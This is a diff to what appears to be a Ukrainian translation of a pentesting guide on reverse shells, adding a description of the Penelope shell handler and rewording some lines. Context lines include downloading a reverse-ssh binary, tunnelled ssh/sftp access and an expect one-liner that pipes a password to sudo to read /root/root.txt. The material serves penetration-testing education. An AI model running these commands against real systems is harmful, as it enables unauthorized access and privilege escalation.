@@ -82,7 +82,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2a) Ціль на Linux:
+* (2a) Лінукс ціль:
 
 {% code overflow="wrap" %}
 ```bash
@@ -112,9 +112,15 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) автоматично оновлює Linux зворотні оболонки до TTY, обробляє розмір терміналу, веде журнали всього і багато іншого. Також вона надає підтримку readline для Windows оболонок.
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## No TTY
 
-Якщо з якоїсь причини ви не можете отримати повний TTY, ви **все ще можете взаємодіяти з програмами**, які очікують введення користувача. У наступному прикладі пароль передається до `sudo`, щоб прочитати файл:
+Якщо з якоїсь причини ви не можете отримати повний TTY, ви **все ще можете взаємодіяти з програмами**, які очікують введення користувача. У наступному прикладі пароль передається до `sudo` для читання файлу:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
